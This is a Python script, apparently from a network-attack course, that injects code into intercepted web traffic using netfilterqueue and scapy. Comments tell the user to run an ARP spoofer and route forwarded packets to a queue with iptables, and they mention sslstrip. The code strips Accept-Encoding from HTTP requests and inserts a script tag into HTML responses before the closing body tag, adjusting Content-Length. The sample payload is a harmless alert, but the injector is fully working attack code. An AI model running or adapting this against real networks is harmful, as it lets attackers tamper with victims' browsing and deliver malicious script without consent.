#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

#if tested on a real network:
#   -launch arp spoofer
#   -set iptables as follow: iptables -i forward -j nfqueue --queue-num 0
#   -lauch this script
#
#once you are done, flush the iptables: iptables --flush

#set the iptables as follow to test on local machine test on local machine
#iptables -i output -j nfqueue --queue-num 0
#iptables -i input -j nfqueue --queue-num 0

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80: #if using sslstriper, change to port 10000
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
            load = load.replace("HTTP/1.1","HTTP/1.0")  #used to not split the response
                                                        # needed when using https

        elif scapy_packet[scapy.TCP].sport == 80: #if using sslstriper, change to port 10000
            print("[+] Response!")
            print(scapy_packet.show())
            injection_code = "<script>alert('test')</script>"
            load = load.replace("</body>",injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet,load)
            packet.set_payload(str(new_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

